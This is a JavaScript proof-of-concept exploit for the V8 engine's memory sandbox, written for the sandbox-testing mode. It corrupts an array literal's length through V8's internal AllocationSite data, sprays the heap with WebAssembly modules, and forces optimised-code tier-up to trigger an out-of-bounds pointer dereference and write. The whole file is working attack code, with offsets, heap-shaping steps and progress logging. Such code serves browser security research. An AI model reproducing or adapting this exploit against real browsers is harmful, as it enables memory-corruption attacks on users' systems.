// --sandbox-testing
const kHeapObjectTag = 1;
const kSmiTagSize = 1;
const kJSFunctionFeedbackCellOffset = 0x18;
const kFeedbackCellValueOffset = 0x4;
const kFeedbackVectorRawFeedbackSlotsOffset = 0x1c;
const kAllocationSiteTransitionInfoOrBoilerplateOffset = 4;
const kJSArrayLengthOffset = 0xc;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getObj(ptr) {
  return Sandbox.getObjectAt(ptr);
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function getField64(obj, offset) {
  return memory.getBigUint64(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}
function setField64(obj, offset, value) {
  memory.setBigUint64(obj + offset - kHeapObjectTag, value, true);
}
function gc() {
  new ArrayBuffer(0x7fe00000);
}
function findObject(start, needle) {
  function match() {
    for (let k = 0; k < needle.length; ++k) {
      if (getField(start, k * 4) != needle[k]) return false;
    }
    return true;
  }
  while (!match()) start += 4;
  return start;
}

function fn(trigger, call_me) {
  let array = [
    0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf,
    0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf,
    0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf,
    0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf,
    0, 1
  ];  // arrayliteral length 0x42 (smi 0x84)
  if (trigger) {
    call_me(...array);
  }
}

let TARGET = 0x424242424242n;

// setup heap spray
console.log(`[*] spraying...`);
let spray_total = 0x80000000;
let spray_buf = new ArrayBuffer(0x7def00);
try {   // bump mmap_threshold
  new WebAssembly.Module(spray_buf);
} catch {}

let spray_buf_u8 = new Uint8Array(spray_buf);
spray_buf_u8.set([0,97,115,109,1,0,0,0,0,243,221,247,3,0,0,0]);
new BigUint64Array(spray_buf).fill(TARGET, 2);

let spray_modules = [];
let spray_cnt = (spray_total / spray_buf.byteLength) | 0;
for (let i = 0; i < spray_cnt * 3 / 4; i++) {
  if (i % 0x10 == 0) {
    console.log(`[*] spray ${i} / ${spray_cnt} (${(i * 100 / spray_cnt).toFixed(2)}%)`);
  }
  spray_buf_u8[0xf] = i;
  spray_buf_u8[0xe] = i >> 8;
  spray_modules.push(new WebAssembly.Module(spray_buf));
}

const call_this = ()=>{};

// pre-allocate zone for heap shaping
gc();

// collect feedback to create AllocationSite boilerplate
for (let i = 0; i < 10; i++) {
  fn(true, call_this);
}

// fetch AllocationSite
let pfn = getPtr(fn);
let pfbc = getField(pfn, kJSFunctionFeedbackCellOffset);
let pfbv = getField(pfbc, kFeedbackCellValueOffset);
let pas = getField(pfbv, kFeedbackVectorRawFeedbackSlotsOffset);

// fetch boilerplate literal
let pbp = getField(pas, kAllocationSiteTransitionInfoOrBoilerplateOffset);
setField(pbp, kJSArrayLengthOffset, 0x80000000 | (0x4c00000 >> 2));
// idx ((val & 0xfffffff) >> 1) + N
// old_to offset: idx * 8
// new_to offset: -idx * 3 * 8

for (let i = spray_modules.length; i < spray_cnt; i++) {
  if (i % 0x10 == 0) {
    console.log(`[*] spray ${i} / ${spray_cnt} (${(i * 100 / spray_cnt).toFixed(2)}%)`);
  }
  spray_buf_u8[0xf] = i;
  spray_buf_u8[0xe] = i >> 8;
  spray_modules.push(new WebAssembly.Module(spray_buf));
}

// tier-up -> JSCallReducer::ReduceCallOrConstructWithArrayLikeOrSpread()
// oob pointer dereference & write
for (let i = 0; i < 0x100000; i++) {
  try {
    fn(true, call_this);
  } catch { }
}
